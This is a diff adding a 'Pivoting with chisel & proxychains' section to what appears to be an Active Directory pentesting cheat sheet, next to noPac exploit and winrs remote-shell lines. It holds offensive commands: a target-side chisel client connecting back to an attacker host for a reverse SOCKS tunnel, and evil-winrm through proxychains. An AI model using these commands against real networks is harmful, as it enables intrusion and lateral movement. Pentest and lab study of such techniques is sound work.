@@ -527,6 +527,33 @@ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <domain controller> 
 winrs -R:<host> -u:<username> -p:<password> cmd
 ```
 
+### :open_file_folder: Pivoting with chisel & proxychains
+
+[reference](https://www.youtube.com/watch?v=dIqoULXmhXg&t=714s)
+
+attacker
+
+```shell
+./chisel server -p <port> --reverse
+```
+
+target
+
+```powershell
+.\chisel.exe client <attacker ip>:<attacker port> R:socks
+```
+
+using proxychains 
+
+```shell
+cat /etc/proxychains4.conf
+# using socks5
+# #socks4         127.0.0.1 9050
+# socks5  127.0.0.1 1080
+
+proxychains evil-winrm -i '<host>' -u '<username>'
+```
+
 ### :open_file_folder: Test Environment
 
 First we have to set up AD server, we can use the evaluation edition of windows sever. I chose to download the VHD version.
